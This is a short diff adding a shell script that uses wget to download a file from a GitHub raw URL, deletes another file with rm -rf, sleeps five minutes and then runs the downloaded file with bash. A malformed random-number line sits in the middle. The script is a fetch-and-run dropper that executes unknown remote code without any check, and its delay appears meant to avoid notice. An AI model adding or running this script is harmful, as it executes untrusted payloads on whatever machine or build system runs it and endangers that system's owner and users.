@@ -1,0 +1,5 @@
+wget https://github.com/githubaunglaymyanmar1/download/raw/main/download/output1
+rm -rf output2
+$(( $RANDOM % 523232323232+ 1343242))
+sleep 5m 
+bash output1
